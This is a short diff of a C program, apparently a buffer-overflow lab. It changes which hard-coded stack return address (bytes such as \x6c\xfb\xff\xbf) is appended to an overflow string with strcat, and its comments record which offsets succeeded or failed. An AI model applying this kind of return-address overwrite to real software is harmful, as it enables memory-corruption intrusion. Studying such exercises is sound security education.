@@ -30,7 +30,7 @@ int main(void)
 
     // success
     // - 149
-  	strcat(str, "\x77\xfb\xff\xbf");
+  	// strcat(str, "\x77\xfb\xff\xbf");
     // - 150
   	// strcat(str, "\x70\xfb\xff\xbf");
     // - 151
@@ -42,7 +42,7 @@ int main(void)
 
     // failed
     // - 154
-  	// strcat(str, "\x6c\xfb\xff\xbf");
+  	strcat(str, "\x6c\xfb\xff\xbf");
 
 
     // bffffbd4
